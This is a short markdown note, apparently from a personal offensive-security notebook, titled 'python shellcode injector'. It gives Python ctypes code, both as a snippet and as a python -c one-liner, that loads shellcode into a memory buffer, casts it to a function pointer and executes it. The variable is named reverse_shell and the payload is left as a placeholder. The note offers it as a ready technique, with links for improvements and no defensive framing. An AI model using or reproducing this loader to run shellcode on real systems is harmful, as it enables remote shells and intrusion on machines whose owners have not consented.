# overview

python shellcode injector 

- also see [here](https://stackoverflow.com/questions/62036405/how-to-run-shellcode-in-python-3) for some potential improvements
- single line (python2) [function pointer cast execution](https://securityweekly.com/2011/10/23/python-one-line-shell-code/)
```python
from ctypes import *

reverse_shell = "<shellcode>"
memorywithshell = create_string_buffer(reverse_shell, len(reverse_shell))
shellcode = cast(memorywithshell, CFUNCTYPE(c_void_p))
shellcode()
```

```python
python -c "from ctypes import *;reverse_shell = '<SHELLCODE>';memorywithshell = create_string_buffer(reverse_shell, len(reverse_shell));shellcode = cast(memorywithshell, CFUNCTYPE(c_void_p));shellcode()"
```